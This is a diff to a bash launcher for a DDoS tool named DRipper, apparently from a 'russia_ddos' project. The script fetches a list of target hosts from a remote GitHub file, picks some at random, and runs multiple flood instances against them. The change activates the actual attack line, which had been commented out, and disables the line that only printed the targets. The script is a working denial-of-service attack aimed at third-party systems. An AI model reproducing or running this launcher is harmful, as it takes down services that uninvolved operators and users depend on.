@@ -33,8 +33,9 @@ do
    cd russia_ddos
    pip install -r requirements.txt > /dev/null
    
-   # Number of targets in DRipper_targets
+   # Get number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
+   
    echo -e "\n===================================="
    echo -e "Number of targets in list: " $list_size "\n"
 
@@ -43,13 +44,14 @@ do
    echo -e "random numbers: " $random_numbers "\n"
    
    # Print targets on screen
-   echo -e "Choosen targets: \n"
+   echo -e "Choosen targets:"
    for i in $random_numbers
    do
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
              echo $site
    done
    echo -e "\n"
+   sleep 10
    
    # Launch multiple DRipper.py instances
    for i in $random_numbers
@@ -61,8 +63,8 @@ do
             port=$(echo $site | awk '{print $2}')
             prot=$(echo $site | awk '{print $3}')
 
-            echo $addr $port $prot
-            # python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+            #echo $addr $port $prot
+            python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
    done
    
    # Restart DRipper_main after N seconds (default 600s = 10m)
